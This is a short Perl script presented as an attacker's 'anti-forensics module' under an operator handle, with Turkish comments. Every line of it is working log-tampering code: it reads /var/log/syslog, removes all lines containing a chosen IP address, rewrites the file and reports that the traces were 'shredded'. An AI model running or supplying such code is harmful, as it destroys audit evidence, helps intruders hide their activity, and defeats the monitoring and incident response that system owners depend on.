#!/usr/bin/perl
# NullSector - Perl Anti-Forensics Module
# Operator: GhostByte

use strict;
use warnings;

print "[*] NullSector Perl-Shredder Active.\n";

my $target_ip = "85.111.76.66";
my $log_file = "/var/log/syslog"; # Tipik Linux log dosyası

if (-e $log_file) {
    open(my $fh, '<', $log_file) or die "Could not open log file.";
    my @lines = <$fh>;
    close($fh);

    # Hedef IP adresimizi içeren tüm satırları temizle
    my @clean_logs = grep { $_ !~ /$target_ip/ } @lines;

    open(my $out, '>', $log_file) or die "Could not write to log file.";
    print $out @clean_logs;
    close($out);

    print "[+] GhostByte, all traces of $target_ip have been shredded.\n";
} else {
    print "[-] Sector log not found, skipping...\n";
}
